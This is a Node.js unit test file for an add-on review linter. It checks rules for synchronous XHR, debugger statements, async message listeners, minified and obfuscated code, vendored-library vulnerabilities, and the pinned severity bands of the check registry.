// Unit tests for the new deterministic rule modules and the yaml-driven loader.

import {
  withManifest,
  parsedSources,
  parsed,
  siblingsOf,
} from "./manifest-ctx.js";
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import syncXhr from "../../src/checks/rules/sync-xhr.js";
import debuggerStatement from "../../src/checks/rules/debugger-statement.js";
import asyncOnMessage from "../../src/checks/rules/async-onmessage.js";
import minimizeHostPermissions from "../../src/checks/rules/minimize-host-permissions.js";
import codeSanity from "../../src/checks/rules/code-sanity.js";
import deprecatedApi from "../../src/checks/rules/deprecated-api.js";
import missingPermission from "../../src/checks/rules/missing-permission.js";
import experimentMissingMax from "../../src/checks/rules/experiment-missing-strict-max-version.js";
import experimentManualReview from "../../src/checks/rules/experiment-manual-review.js";
import experimentUnknownApi from "../../src/checks/rules/experiment-unknown-api.js";
import nonExperimentMax from "../../src/checks/rules/non-experiment-strict-max-version.js";
import experimentNotAllowed from "../../src/checks/rules/experiment-not-allowed.js";
import missingLibrary from "../../src/checks/rules/missing-library.js";
import minifiedCode from "../../src/checks/rules/minified-code.js";
import obfuscatedCode from "../../src/checks/rules/obfuscated-code.js";
import {
  VERDICT,
  URL_CLASS,
  OVERTNESS,
  REVIEW_MODE,
} from "../../src/lib/enum.js";
import vendorVulnerable from "../../src/checks/rules/vendor-vulnerable.js";
import vendorVulnerableDev from "../../src/checks/rules/vendor-vulnerable-dev.js";
import { rawSha256 } from "../../src/normalize/hash.js";
import trademarkViolation from "../../src/checks/rules/trademark-violation.js";
import coreSymbolInWebext from "../../src/checks/rules/core-symbol-in-webext.js";
import missingEnglish from "../../src/checks/rules/missing-english-localization.js";
import disguisedResource from "../../src/checks/rules/disguised-resource.js";
import disguisedStylesheet from "../../src/checks/rules/disguised-stylesheet.js";
import disguisedTransmission from "../../src/checks/rules/disguised-transmission.js";
import unparsableFile from "../../src/checks/rules/unparsable-file.js";
import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
import undeclaredBuildSource from "../../src/checks/rules/undeclared-build-source.js";
import unsupportedBuildTool from "../../src/checks/rules/unsupported-build-tool.js";
import buildRegistryRedirect from "../../src/checks/rules/build-registry-redirect.js";
import committedNodeModules from "../../src/checks/rules/committed-node-modules.js";
import cleartextTransmission from "../../src/checks/rules/cleartext-transmission.js";
import privacyPolicy from "../../src/checks/rules/privacy-policy.js";
import nativeMessaging from "../../src/checks/rules/native-messaging.js";
import defaultLocaleMissing from "../../src/checks/rules/default-locale-missing.js";
import defaultLocaleUnused from "../../src/checks/rules/default-locale-unused.js";
import addonIconMissing from "../../src/checks/rules/addon-icon-missing.js";
import unrecognizedManifestKey from "../../src/checks/rules/unrecognized-manifest-key.js";
import backgroundModule from "../../src/checks/rules/background-module.js";
import unusedPermissionProducer from "../../src/checks/rules/unused-permission.js";
import unrecognizedFileType from "../../src/checks/rules/unrecognized-file-type.js";
import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { parseApiUsage } from "../../src/parse/api-usage.js";
import { getPermissionAnalysis } from "../../src/lib/permissions.js";
import {
  loadChecks,
  loadRegistry,
  runOneCheck,
  runChecks,
  assertRequiredPhaseSections,
  Registry,
} from "../../src/checks/registry.js";
import { finding, SEVERITY } from "../../src/report/finding.js";

// loadChecks groups its result by phase (a check's phase IS the list it lands in).
// Flatten it when a test cares about the checks themselves, not which phase they run in.
const allChecks = (byPhase) => [...byPhase.values()].flat();
import unknownApi from "../../src/checks/rules/unknown-api.js";
import { resolveApiUsages, unknownApis } from "../../src/lib/api-resolution.js";
import { sinkLabel } from "../../src/lib/outbound-sinks.js";
import strictMaxVersionApi from "../../src/checks/rules/strict-max-version-api.js";
import strictMinVersionApi from "../../src/checks/rules/strict-min-version-api.js";
import { loadSchemaFiles } from "../../src/schema/load.js";
import { buildSchemaIndex, SchemaIndex } from "../../src/schema/index.js";
import { collectJsSources } from "../../src/addon/sources.js";
import { runExtractionPass, apiUsageOf } from "../../src/checks/extract.js";
import { parseVendorManifest } from "../../src/normalize/vendor.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const schema = buildSchemaIndex(
  loadSchemaFiles(path.join(here, "..", "schema-fixture"))
);

const jsCtx = (code, manifest = {}) => ({
  jsSources: parsed([{ file: "f.js", code, lineOffset: 0, inline: false }]),
  addon: { files: new Map(), manifest },
  schema,
  options: {},
});

// ctx whose addon.files is a path->content map (for the file-level bundled /
// obfuscated checks, which read raw file bytes rather than parsed sources). The
// vendored set is resolved deterministically, as the pipeline does once up front.
const filesCtx = (files, { libs = [] } = {}) => {
  const addon = {
    files: new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])),
  };
  const manifest = parseVendorManifest(addon);
  addon.vendor = { set: new Set(manifest.map((e) => e.path)), manifest };
  // `libs`: file keys whose raw hash is registered as a known library, so the
  // hash-based classifier tags them `library` (and names them).
  const libraryHashes = new Map(
    libs.map((f) => [
      rawSha256(addon.files.get(f)),
      { name: "demolib", version: "1.0.0" },
    ])
  );
  return { addon, options: { libraryHashes } };
};

// Run a check with a fake ctx.note collector and return the recorded activity.
function notesFrom(check, ctx) {
  const notes = [];
  ctx.note = (file, loc, item, verdict) => notes.push({ file, item, verdict });
  check.run(withManifest(ctx));
  return notes;
}

// ---- sync-xhr ----
// Only the explicit async=false third arg to open() is a synchronous XHR;
// async=true and an omitted third arg (defaults to async) must not flag.
test("sync-xhr flags open(..., false), not async/omitted", () => {
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u", false);`))).findings
      .length,
    1
  );
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u", true);`))).findings
      .length,
    0
  );
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u");`))).findings.length,
    0
  );
});

// ---- debugger ----
// Every shipped `debugger` is a question for a reader and none is a finding. The rows
// that matter are the CONDITIONAL ones: an `if` used to be read as a config flag and
// silently cleared the statement, so `if (message.author.includes("@")) { debugger; }` -
// which halts Thunderbird for any user who receives such a message - was reported to
// nobody. An enclosing `if` is a shape, not evidence about who can reach the statement.
test("debugger-statement raises every statement, conditional or not", () => {
  const run = (code) => debuggerStatement.run(withManifest(jsCtx(code)));
  for (const code of [
    `debugger;`,
    `function f() { doStuff(); debugger; }`,
    `for (const x of xs) { debugger; }`,
    `if (DEBUG) debugger;`,
    `if (config.debug) { debugger; }`,
    `if (x) {} else { debugger; }`,
    `if (message.author.includes("@")) { debugger; }`,
    `if (tab.id > 0) { for (const x of xs) { if (x) { debugger; } } }`,
  ]) {
    const out = run(code);
    assert.deepEqual(out.findings, [], code);
    assert.equal(out.escalations.length, 1, code);
  }
});

// ---- async onMessage ----
// The events that matter are the ones the SCHEMA says answer with their listener's
// return value - they hand the listener a sendResponse and declare a return. So
// onMessage and onMessageExternal flag, while the near neighbour onConnect (a port,
// no return) and an ordinary event like tabs.onUpdated do not, however async their
// listener is. The finding names the event, so one message serves them all.
test("async-onmessage flags every event that answers with its return value", () => {
  const items = (code) =>
    asyncOnMessage.run(withManifest(jsCtx(code))).findings.map((f) => f.item);
  assert.deepEqual(
    items(`browser.runtime.onMessageExternal.addListener(async (m) => {});`),
    ["runtime.onMessageExternal"]
  );
  assert.deepEqual(
    items(`messenger.runtime.onMessage.addListener(async (m) => {});`),
    ["runtime.onMessage"]
  );
  assert.deepEqual(
    items(`browser.runtime.onUserScriptMessage.addListener(async (m) => {});`),
    ["runtime.onUserScriptMessage"]
  );
  // Hands over a port and reads no return value: an async listener claims nothing.
  assert.deepEqual(
    items(`browser.runtime.onConnect.addListener(async (p) => {});`),
    []
  );
  // An ordinary event, and a chain that merely ends in those names - neither
  // resolves to an event that answers, so neither is this check's business.
  assert.deepEqual(
    items(`chrome.tabs.onUpdated.addListener(async (t) => {});`),
    []
  );
  assert.deepEqual(
    items(`browser.foo.runtime.onMessage.addListener(async (m) => {});`),
    []
  );
  // Reaching PAST an event is not that event: resolution matches the longest known
  // prefix, so the path has to be the event itself or the report would name an API
  // that does not exist.
  assert.deepEqual(
    items(
      `browser.runtime.onMessage.hasListener.addListener(async (m) => {});`
    ),
    []
  );
});

// Only an async callback on runtime.onMessage flags (it breaks sendResponse);
// a sync onMessage listener and an unrelated async addEventListener do not.
test("async-onmessage flags an async runtime.onMessage listener only", () => {
  assert.equal(
    asyncOnMessage.run(
      withManifest(
        jsCtx(`browser.runtime.onMessage.addListener(async (m) => {});`)
      )
    ).findings.length,
    1
  );
  assert.equal(
    asyncOnMessage.run(
      withManifest(jsCtx(`messenger.runtime.onMessage.addListener((m) => {});`))
    ).findings.length,
    0
  );
  assert.equal(
    asyncOnMessage.run(
      withManifest(jsCtx(`el.addEventListener("click", async () => {});`))
    ).findings.length,
    0
  );
});

// sync-xhr / debugger-statement / async-onmessage are source-level coding-pattern
// checks: like code-sanity they skip non-authored (library / minified / vendored)
// code, so a library's own sync XHR, debugger, or async onMessage listener is not
// flagged. The same patterns in an authored file are still flagged.
test("sync-xhr / debugger / async-onmessage skip non-authored code", () => {
  const body =
    `x.open("GET", "/u", false);\n` +
    `debugger;\n` +
    `browser.runtime.onMessage.addListener(async (m) => {});\n`;
  const code = body + "var a = 1;\n".repeat(200); // >1KB so it is classified
  const ctxFor = (file, lib = false) => ({
    jsSources: parsed([{ file, code, lineOffset: 0 }]),
    addon: { files: new Map([[file, Buffer.from(code)]]), manifest: {} },
    schema,
    options: lib
      ? {
          libraryHashes: new Map([
            [rawSha256(Buffer.from(code)), { name: "lib", version: "1" }],
          ]),
        }
      : {},
  });
  // A hash-identified library -> non-authored -> all three checks skip it. debugger
  // escalates rather than rejecting, so its silence is measured on the other array.
  const lib = ctxFor("vendor/lib.min.js", true);
  assert.equal(syncXhr.run(withManifest(lib)).findings.length, 0);
  assert.equal(debuggerStatement.run(withManifest(lib)).escalations.length, 0);
  assert.equal(asyncOnMessage.run(withManifest(lib)).findings.length, 0);
  // The same code, not a known library, is still reported by each.
  const app = ctxFor("src/app.js");
  assert.equal(syncXhr.run(withManifest(app)).findings.length, 1);
  assert.equal(debuggerStatement.run(withManifest(app)).escalations.length, 1);
  assert.equal(asyncOnMessage.run(withManifest(app)).findings.length, 1);
});

// ---- minimize host permissions ----
// Broad required host patterns (<all_urls> and *://*/*) are flagged, while a
// specific scoped origin like https://example.com/* is left alone.
test("minimize-host-permissions flags broad required host patterns only", () => {
  const out = minimizeHostPermissions.run(
    withManifest(
      jsCtx("", {
        host_permissions: ["<all_urls>", "*://*/*", "https://example.com/*"],
      })
    )
  ).findings;
  assert.equal(out.length, 2); // all_urls + *://*/* ; example.com is scoped
});

// ---- code sanity (ESLint) ----
// prefer-const is a style/fixable rule, not a review concern, so it is never
// flagged. no-undef is off too, so browser/messenger globals are never flagged.
test("code-sanity does not flag prefer-const or globals", () => {
  const neverReassigned = `let x = 1;\nconsole.log(x);`;
  assert.equal(
    codeSanity.run(withManifest(jsCtx(neverReassigned))).findings.length,
    0
  );

  // browser/messenger are not flagged as undefined (no-undef is disabled).
  const clean = codeSanity.run(
    withManifest(
      jsCtx(`const y = browser.runtime.id;\nmessenger.tabs.query({});`)
    )
  ).findings;
  assert.equal(clean.length, 0);
});

// no-empty flags an empty block (e.g. an error-swallowing empty catch), but not
// an empty function body (which is no-empty-function's concern, not enabled). The
// rule runs whenever code-sanity runs - the --eslint gate is applied upstream at
// check selection (pipeline.js), not in the rule.
test("code-sanity flags an empty block, not an empty function body", () => {
  const out = codeSanity.run(
    withManifest(jsCtx(`try { risky(); } catch (e) {}`))
  ).findings;
  assert.equal(out.length, 1);
  assert.match(out[0].item, /no-empty/);
  assert.equal(
    codeSanity.run(withManifest(jsCtx(`const f = () => {};`))).findings.length,
    0
  );
});

// Third-party / minified / obfuscated / VENDOR.md code is not linted (its
// findings are noise); the same code under an authored filename is.
test("code-sanity skips non-authored code, lints authored code", () => {
  const redecl = "var a = 1;\n".repeat(200); // ~2KB, trips no-redeclare, short lines
  const ctxFor = (file, lib = false) => ({
    jsSources: parsed([{ file, code: redecl, lineOffset: 0 }]),
    addon: { files: new Map([[file, Buffer.from(redecl)]]), manifest: {} },
    options: lib
      ? {
          libraryHashes: new Map([
            [rawSha256(Buffer.from(redecl)), { name: "lib", version: "1" }],
          ]),
        }
      : {},
  });
  // A hash-identified library -> non-authored -> skipped entirely.
  assert.equal(
    codeSanity.run(withManifest(ctxFor("vendor/lib.min.js", true))).findings
      .length,
    0
  );
  // Authored source of the same code is linted.
  assert.ok(
    codeSanity.run(withManifest(ctxFor("src/app.js"))).findings.length > 0
  );
});

// ---- missing-library / obfuscated-code (shared bundled.js classifier) ----
// missing-library flags a bundled file whose CONTENT HASH matches a known library
// release (`libs`), skipping the developer's own code and VENDOR.md-declared
// files. A file the hash DB does not recognize - even a UMD-wrapper or a .min name
// - is not a library (only a content-hash match is the library signal).
test("missing-library flags hash-identified libraries, not undeclared/readable/VENDORed", () => {
  const MIN = "a;".repeat(600);
  // Hash match -> flagged.
  assert.equal(
    missingLibrary.run(
      withManifest(
        filesCtx({ "vendor/x.min.js": MIN }, { libs: ["vendor/x.min.js"] })
      )
    ).findings.length,
    1
  );
  // A UMD wrapper NOT in the hash DB -> not a library.
  const umd =
    "(function () { if (typeof exports === 'object' && typeof define === 'function') {} })();\n".repeat(
      40
    );
  assert.equal(
    missingLibrary.run(withManifest(filesCtx({ "lib/umd.js": umd }))).findings
      .length,
    0
  );
  // Readable code -> not flagged.
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  assert.equal(
    missingLibrary.run(withManifest(filesCtx({ "bg.js": readable }))).findings
      .length,
    0
  );
  // A known library declared in VENDOR.md -> excluded before classification.
  const vendor =
    "vendor/x.min.js:\n - Version: 1.0\n - URL: https://unpkg.com/x@1.0.0/dist/x.min.js\n";
  assert.equal(
    missingLibrary.run(
      withManifest(
        filesCtx(
          { "VENDOR.md": vendor, "vendor/x.min.js": MIN },
          { libs: ["vendor/x.min.js"] }
        )
      )
    ).findings.length,
    0
  );
});

// minified-code flags minified (but not obfuscated) NON-library code; a file the
// hash DB recognizes as a library is deferred to missing-library, obfuscated code
// to obfuscated-code, and readable code is left alone.
test("minified-code flags minified non-library JS only", () => {
  // Minified line geometry: one long, dense line.
  const minified = "var a=1;b=2;c=3;d=4;".repeat(100) + "\n";
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "bundle.js": minified }))).findings
      .length,
    1
  );
  // The same bytes recognized as a known library -> missing-library's job.
  assert.equal(
    minifiedCode.run(
      withManifest(filesCtx({ "x.min.js": minified }, { libs: ["x.min.js"] }))
    ).findings.length,
    0
  );
  // Readable code -> not flagged.
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "bg.js": readable }))).findings
      .length,
    0
  );
});

// obfuscated-code flags obfuscated NON-library code, and NOT a merely-minified
// file (that is minified-code's job). A file that is BOTH minified and obfuscated
// is reported here only (obfuscation is the stronger signal), so it never yields
// two findings.
test("obfuscated-code flags obfuscated JS; minified-only routes elsewhere", () => {
  // Array-replacement obfuscation on short lines: obfuscated (recognized by
  // structure), NOT minified-by-geometry.
  const obf =
    `var _0xarr = [${Array.from({ length: 60 }, (_, i) => `"item_${i}"`).join(", ")}];\n` +
    "function _0xget(i) { return _0xarr[i]; }\n" +
    Array.from({ length: 20 }, (_, i) => `console["log"](_0xget(${i}));`).join(
      "\n"
    );
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "o.js": obf }))).findings.length,
    1
  );
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "o.js": obf }))).findings.length,
    0
  );
  // A merely-minified file is NOT obfuscated-code's concern.
  const minified = "var a=1;b=2;c=3;d=4;".repeat(100) + "\n";
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "m.js": minified }))).findings
      .length,
    0
  );
  // The same obfuscation collapsed onto one dense line -> minified geometry AND
  // obfuscated -> obfuscated-code only (precedence), minified-code stays silent.
  const both =
    `var _0xa=[${Array.from({ length: 80 }, (_, i) => `"s${i}"`).join(",")}];` +
    "function _0xg(i){return _0xa[i];}" +
    Array.from({ length: 80 }, (_, i) => `console.log(_0xg(${i}));`).join("");
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "b.js": both }))).findings
      .length,
    1
  );
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "b.js": both }))).findings.length,
    0
  );
});

// A revealing-module file - which the library recognizes, under a family that is not
// pinned because readable code has that shape too - is ordinary code: no finding, and
// nobody asked to look at it.
test("obfuscated-code ignores a match no pinned family made", () => {
  // A revealing-module pattern over the 1024-byte floor: an IIFE-initialized
  // const referenced only as `Helper.method(...)`, the structure the unpinned
  // family applies no density guard to.
  const methods = Array.from(
    { length: 12 },
    (_, i) =>
      `  function step${i}(value) {\n` +
      `    const result = String(value || "").trim().toLowerCase();\n` +
      `    return result.length > ${i} ? result : "fallback${i}";\n` +
      `  }\n`
  ).join("");
  const returns = Array.from({ length: 12 }, (_, i) => `step${i}`).join(", ");
  const calls = Array.from(
    { length: 12 },
    (_, i) => `Helper.step${i}("x${i}");`
  ).join("\n");
  const unpinned = `const Helper = (() => {\n${methods}  return { ${returns} };\n})();\n${calls}\n`;

  const step = obfuscatedCode.run(
    withManifest(filesCtx({ "app.js": unpinned }))
  );
  assert.equal(step.findings.length, 0);
  assert.equal(step.escalations, undefined);
});

// vendor-vulnerable surfaces a vulnerability the OSV audit recorded for a
// hash-IDENTIFIED (undeclared) library too - it reads addon.vendor.vulnerabilities
// regardless of source. Such an entry carries an empty token (no declaration
// line), so the finding has no line and anchors at the bundled file - even if the
// file body happens to contain its own path. The OSV band still drives severity.
test("vendor-vulnerable surfaces an identified-library vulnerability, file-anchored", () => {
  const file = "vendor/jquery.min.js";
  const ctx = {
    addon: {
      files: new Map([
        // The path appears in a sourcemap comment - an empty token must still
        // yield no line (the guard must not fall back to a substring match).
        [file, Buffer.from(`var a=1;\n//# sourceMappingURL=${file}.map\n`)],
      ]),
      vendor: {
        vulnerabilities: [
          {
            name: "jquery",
            version: "1.7.2",
            ids: ["CVE-2020-11022"],
            severity: "high",
            fixed: ["3.5.0"],
            file,
            token: "", // no declaration line for an identified library
          },
        ],
      },
    },
  };
  const out = vendorVulnerable.run(withManifest(ctx)).findings;
  assert.equal(out.length, 1);
  assert.equal(out[0].file, file);
  assert.equal(out[0].item, "jquery");
  assert.ok(!out[0].loc); // no declaration line - anchored at the file
  assert.equal(out[0].severity, SEVERITY.ERROR); // high band -> error
});

// vendor-vulnerable-dev mirrors vendor-vulnerable for the SCA dev set: it reads
// addon.vendor.devVulnerabilities (populated only in SCA mode) and maps each to a
// finding, band-driven severity and all. A package.json dep anchors at its name.
test("vendor-vulnerable-dev surfaces a dev-dependency vulnerability", () => {
  const ctx = {
    addon: {
      files: new Map([
        [
          "package.json",
          Buffer.from('{"devDependencies":{"esbuild":"0.19.0"}}'),
        ],
      ]),
      vendor: {
        devVulnerabilities: [
          {
            name: "esbuild",
            version: "0.19.0",
            ids: ["CVE-2021-0002"],
            severity: "moderate",
            fixed: ["0.19.1"],
            file: "package.json",
            token: "esbuild",
          },
        ],
      },
    },
  };
  const out = vendorVulnerableDev.run(withManifest(ctx)).findings;
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "esbuild");
  assert.equal(out[0].loc.line, 1); // anchored at the dep's declaration line
  assert.equal(out[0].severity, SEVERITY.WARNING); // moderate band -> warning
  assert.equal(out[0].data.fixed, "0.19.1");
});

// The prod set drives vendor-vulnerable, the dev set drives this check - so an
// empty dev set yields nothing.
test("vendor-vulnerable-dev yields nothing when devVulnerabilities is empty", () => {
  const ctx = {
    addon: { files: new Map(), vendor: { devVulnerabilities: [] } },
  };
  assert.deepEqual(vendorVulnerableDev.run(withManifest(ctx)).findings, []);
});

// ---- unparsable-file (static-analysis self-report) ----
// A file that failed to parse had every AST-based check skipped over it, so the parse
// error is reported with the parser's own wording. A source that parsed cleanly yields
// nothing. Severity is left unset - runChecks stamps the yaml entry's type ("info").
test("unparsable-file flags parse failures", () => {
  const apiUsages = [
    { file: "broken.js", parseError: "Unexpected token (3:5)" },
    { file: "ok.js", limitations: [] },
  ];
  const unparsable = unparsableFile.run(withManifest({ apiUsages })).findings;
  assert.equal(unparsable.length, 1);
  assert.equal(unparsable[0].file, "broken.js");
  assert.equal(unparsable[0].severity, null);
  // The "could not be parsed" wording lives in the registry; the check emits the
  // parser error as data.
  assert.match(unparsable[0].data.detail, /Unexpected token/);
});

// The eslint gate (eslintEligible): code-sanity is eslint:true, so it loads ONLY with the
// --eslint flag. Gated in loadChecks, before the import, so the eslint dependency is not
// pulled in when the check will not run.
test("code-sanity is gated by the --eslint flag", async () => {
  const off = allChecks(await loadChecks(loadRegistry()));
  assert.equal(
    off.some((c) => c.id === "code-sanity"),
    false
  );
  const on = allChecks(await loadChecks(loadRegistry(), { eslint: true }));
  assert.equal(
    on.some((c) => c.id === "code-sanity"),
    true
  );
});

// The SCA mode gate (scaEligible, mirrors the diff gate): the build and dependency
// checks are sca:true (they review an archive, absent from an XPI-only submission), and
// everything else is untagged - it runs in both modes and the orchestrator switches the
// review SOURCE under it. NO entry declares sca:false today: the vendor and library
// checks used to, which silently exempted a source archive's declared files from review
// while nothing verified the declaration. The gate itself remains for a check that
// genuinely cannot run on a source archive.
test("checks carry the sca mode tag (true=SCA-only, undefined=both; none is XPI-only)", async () => {
  const checks = allChecks(await loadChecks(loadRegistry()));
  const sca = (id) => checks.find((x) => x.id === id)?.sca;
  assert.deepEqual(
    checks.filter((c) => c.sca === false).map((c) => c.id),
    []
  );
  // minified-code runs in BOTH modes: a minified file is non-authored and rejected
  // whether it ships in a built XPI or sits in a source-code submission's source.
  assert.equal(sca("minified-code"), undefined);
  // The vendor/library family runs in both too: a source archive may carry its own
  // VENDOR file, verified the same way (verifyVendorDeclarations), and the CDN/hash
  // identification runs on the source as well (identifyBundledLibraries, scope source).
  assert.equal(sca("untrusted-minified-library"), undefined);
  assert.equal(sca("untrusted-library"), undefined);
  assert.equal(sca("vendor-modified"), undefined);
  assert.equal(sca("unpinned-vendor-source"), undefined);
  // unused-files runs in BOTH modes: it describes the shipped XPI (dead files the
  // build ships), like bundled-files / minimize-WAR - all registered `input: xpi`.
  assert.equal(sca("unused-files"), undefined);
  assert.equal(sca("unpopular-source-dependency"), true); // SCA-only dep audit
  assert.equal(sca("undeclared-build-source"), true); // SCA-only build review
  assert.equal(sca("unsupported-build-tool"), true); // SCA-only build policy
  assert.equal(sca("build-registry-redirect"), true); // SCA-only build policy
  assert.equal(sca("committed-node-modules"), true); // SCA-only build policy
  assert.equal(sca("eval-call"), undefined); // a code check: both modes
  assert.equal(sca("unknown-api"), undefined);
});

// `escalation` and `instructions` are one declaration in two halves: the section a case is
// listed under, and the wording it is listed with. loadChecks refuses either alone, because
// both failures would otherwise surface only when a case first reached them - which may be
// never. This pins the whole map, so a new escalating check must declare its section.
test("every escalating check declares a section, and only those", async () => {
  const checks = allChecks(await loadChecks(loadRegistry(), { eslint: true }));
  const bySection = {};
  for (const c of checks) {
    if (c.escalation) (bySection[c.escalation] ??= []).push(c.id);
    // The two halves travel together: no check has one without the other.
    assert.equal(
      Boolean(c.escalation),
      Boolean(c.instructions),
      `${c.id}: escalation and instructions must be declared together`
    );
  }
  for (const k of Object.keys(bySection)) bySection[k].sort();
  assert.deepEqual(bySection, {
    "code-review": [
      "build-lifecycle-hook",
      "data-exfiltration",
      "debugger-statement",
      "disguised-transmission",
      "experiment-unknown-api",
      "minimize-web-accessible-resources",
      "missing-english-localization",
      "remote-eval",
      "remote-resources",
      "strict-min-version-api",
      "unknown-api",
      "unused-files",
      "unused-permission",
    ],
    "manual-review": [
      "experiment-manual-review",
      "native-messaging",
      "privacy-policy",
      "undeclared-build-source",
      "vendored-remote-resources",
    ],
  });
});

// Severity is the ONE thing that decides whether a finding rejects a submission, and
// the JSON report is an upload filter that can auto-reject before a human sees it. It
// is observable only through a rendered report, and 22 checks fire in no fixture - so
// demoting one of those from error to info changed nothing anywhere in this suite.
// This pins the whole map: a flipped severity, or a new check landing in the wrong
// band, trips here rather than silently softening a reject.
//
// The registry also NEVER defaults it (loadChecks throws on a missing severity), so an
// entry cannot acquire a band by omission - the assertion below is the declared value.
// `none` is the band for a check that emits no findings: it has nothing to report at, and
// runOneCheck refuses a finding from one, so nothing can reach the upload filter at a
// severity nobody chose. WHERE such a check's cases are listed is a separate field
// (`escalation`), pinned by its own test.
test("every check's severity is pinned to its band", async () => {
  // eslint: true so the opt-in code-sanity check is loaded and pinned like the rest.
  const checks = allChecks(await loadChecks(loadRegistry(), { eslint: true }));
  const actual = {};
  for (const c of checks) (actual[c.severity] ??= []).push(c.id);
  for (const k of Object.keys(actual)) actual[k].sort();
  // No `none` key: every check that escalates declares the band a reported case carries.
  // The value still exists for a check that emits nothing at all, and runOneCheck still
  // refuses a finding from one - it simply has no entry today.
  assert.deepEqual(actual, {
    error: [
      "background-module",
      "background-page-module",
      "build-lifecycle-hook",
      "build-registry-redirect",
      "bundled-files",
      "cleartext-transmission",
      "committed-build-artifact",
      "committed-node-modules",
      "core-symbol-in-webext",
      "csp-unsafe-eval",
      "csp-unsafe-inline",
      "data-exfiltration",
      "debugger-statement",
      "default-locale-missing",
      "default-locale-unused",
      "disguised-navigation",
      "disguised-resource",
      "disguised-stylesheet",
      "disguised-transmission",
      "disguised-window",
      "eval-call",
      "experiment-manual-review",
      "experiment-missing-strict-max-version",
      "experiment-modified",
      "experiment-not-allowed",
      "experiment-overrides-api",
      "experiment-unknown-api",
      "function-constructor",
      "manifest-invalid-json",
      "manifest-missing",
      "manifest-missing-key",
      "manifest-unknown-permission",
      "manifest-version-mismatch",
      "minified-code",
      "missing-manifest-key",
      "missing-permission",
      "multiple-vendor-files",
      "obfuscated-code",
      "remote-eval",
      "remote-resources",
      "strict-max-version-api",
      "strict-min-version-api",
      "string-timer",
      "sync-xhr",
      "trademark-violation",
      "undeclared-build-source",
      "unknown-api",
      "unpinned-dependency",
      "unpinned-vendor-source",
      "unpopular-source-dependency",
      "unrecognized-file-type",
      "unsupported-build-tool",
      "unsupported-dependency",
      "untrusted-minified-library",
      "unused-files",
      "update-url",
      "vendor-ambiguous-source",
      "vendor-modified",
      "vendor-unparseable",
      "vendored-remote-resources",
    ],
    warning: [
      "async-onmessage",
      "minimize-web-accessible-resources",
      "missing-english-localization",
      "missing-vendor-file",
      "mistyped-manifest-value",
      "non-experiment-strict-max-version",
      "sca-not-required",
      "unused-permission",
    ],
    info: [
      "addon-icon-missing",
      "code-sanity",
      "deprecated-api",
      "find-lib-on-cdn",
      "minimize-host-permissions",
      "missing-library",
      "unparsable-file",
      "unrecognized-manifest-key",
      "unsafe-html",
      "untrusted-library",
      "vendor-vuln-unknown",
    ],
    auto: ["banned-library", "vendor-vulnerable", "vendor-vulnerable-dev"],
    // Blocks the review without rejecting the add-on - the fix is on the ATN listing,
    // so no rebuild would help. Resolves to error only alongside a real one.
    "hold-or-error": ["native-messaging", "privacy-policy"],
  });
});

// The band cannot be acquired implicitly: an entry that omits severity is a registry
// mistake, not a request for the strictest value, so the loader refuses it by name.
test("loadChecks refuses a check entry with no severity", async () => {
  const reg = new Registry({
    "deterministic-phase": [{ title: "X", check: "sync-xhr", input: "source" }],
  });
  await assert.rejects(loadChecks(reg), /missing or invalid severity/);
});

// A check authors a `sweep-instruction` for a blind spot it cannot close by naming more
// cases - an enumerated set of transmission APIs says nothing about a sender it does not
// list. What a reader finds there is filed AS that check, so the set of checks asking is
// pinned here for the same reason the severity and escalation maps above are: one landing
// on the wrong check, or lost to a yaml typo, is invisible in every other test.
test("the checks that sweep their own blind spot are exactly these", () => {
  const reg = loadRegistry();
  assert.deepEqual(
    reg.sweepInstructions().map((s) => [s.check, s.severity]),
    [
      ["disguised-resource", "error"],
      ["disguised-stylesheet", "error"],
      ["disguised-window", "error"],
      ["disguised-navigation", "error"],
      ["cleartext-transmission", "error"],
      ["privacy-policy", "hold"],
      ["data-exfiltration", "error"],
      ["disguised-transmission", "error"],
    ]
  );
  // Every one of them can actually receive what its sweep finds: a band to stamp an
  // addition with, and a response with no placeholder an addition brings nothing to fill.
  for (const s of reg.sweepInstructions()) {
    assert.ok(s.severity, `${s.check} has a band`);
    assert.ok(
      !(reg.checkEntry(s.check).response ?? "").includes("{{"),
      `${s.check} response takes no placeholder`
    );
  }
  assert.equal(reg.sweepInstruction("eval-call"), null);
});

// The three things that must hold for a sweep instruction to be fileable are config, so
// they fail at LOAD time rather than when an addition first arrives - which may be never.
test("loadChecks refuses a sweep-instruction it could not file a finding for", async () => {
  const entry = (extra) => ({
    title: "X",
    check: "sync-xhr",
    severity: "error",
    input: "source",
    ...extra,
  });
  await assert.rejects(
    loadChecks(
      new Registry({
        "deterministic-phase": [entry({ "sweep-instruction": "  " })],
      })
    ),
    /invalid `sweep-instruction`/
  );
  // `auto` leaves the band to each finding and `none` says the check emits none, so
  // neither has one to stamp an addition with.
  for (const severity of ["auto", "none"]) {
    await assert.rejects(
      loadChecks(
        new Registry({
          "deterministic-phase": [
            entry({ severity, "sweep-instruction": "look for X" }),
          ],
        })
      ),
      /gives a reported case no band to carry/
    );
  }
  // An addition carries no item, so a placeholder would reach the developer literally.
  await assert.rejects(
    loadChecks(
      new Registry({
        "deterministic-phase": [
          entry({
            "sweep-instruction": "look for X",
            response: "Remove {{item}}.",
          }),
        ],
      })
    ),
    /carries a {{placeholder}}/
  );
});

// The shipped-vs-review-target artifact is chosen in ONE place - runChecks routes
// each check to its artifact's context on the registry `input` (source = the review
